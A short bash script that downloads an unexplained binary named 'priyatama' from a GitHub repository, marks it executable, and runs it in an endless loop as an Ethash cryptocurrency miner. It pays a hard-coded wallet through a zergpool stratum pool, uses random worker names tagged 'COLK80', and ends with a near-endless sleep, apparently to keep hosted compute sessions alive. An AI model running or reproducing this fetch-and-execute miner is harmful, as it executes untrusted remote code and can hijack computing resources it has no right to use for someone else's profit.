#!/bin/bash
POOL=stratum+tcp://ethash.asia.mine.zergpool.com:9999
WALLET=0xa5260d62edb9d77c9e7173fb3a60c75c9211a3d9
WORKER=$(echo $(shuf -i 1-40 -n 1)-COLK80)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
